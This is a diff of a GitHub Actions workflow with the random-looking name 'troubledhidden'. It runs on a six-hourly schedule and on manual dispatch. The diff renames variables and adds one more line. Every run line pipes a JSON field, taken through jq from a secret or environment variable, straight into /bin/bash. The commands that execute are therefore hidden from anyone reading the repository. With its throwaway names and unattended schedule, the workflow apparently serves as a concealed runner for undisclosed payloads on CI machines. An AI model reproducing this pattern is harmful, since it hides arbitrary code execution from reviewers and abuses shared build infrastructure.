@@ -2,20 +2,22 @@ name: troubledhidden
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 0/6 * * *'
-jobs:  # 30231
+    - cron: '9 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: troubledhidden
         env:
-          hxb0: ${{ secrets.hxb0 }}
+          xzt0141: ${{ secrets.xzt0141 }}
         run: |
-          echo $hxb0 | jq -r .k91 | /bin/bash
-          echo $hgug8 | jq -r .efv02 | /bin/bash
-          echo $qo5 | jq -r .ngh99 | /bin/bash
-          echo $t11 | jq -r .d232 | /bin/bash
-          echo $dnahb1 | jq -r .kwd6643 | /bin/bash
-          echo $z869 | jq -r .myad0036 | /bin/bash
+          echo $xzt0141 | jq -r .bi98444 | /bin/bash
+          echo $jiwh0182 | jq -r .frk44663 | /bin/bash
+          echo $zbm729 | jq -r .pqfww764 | /bin/bash
+          echo $f365 | jq -r .daca0 | /bin/bash
+          echo $zo1754 | jq -r .je7 | /bin/bash
+          echo $n8 | jq -r .likz60 | /bin/bash
+          echo $ksag4 | jq -r .efect168 | /bin/bash
 
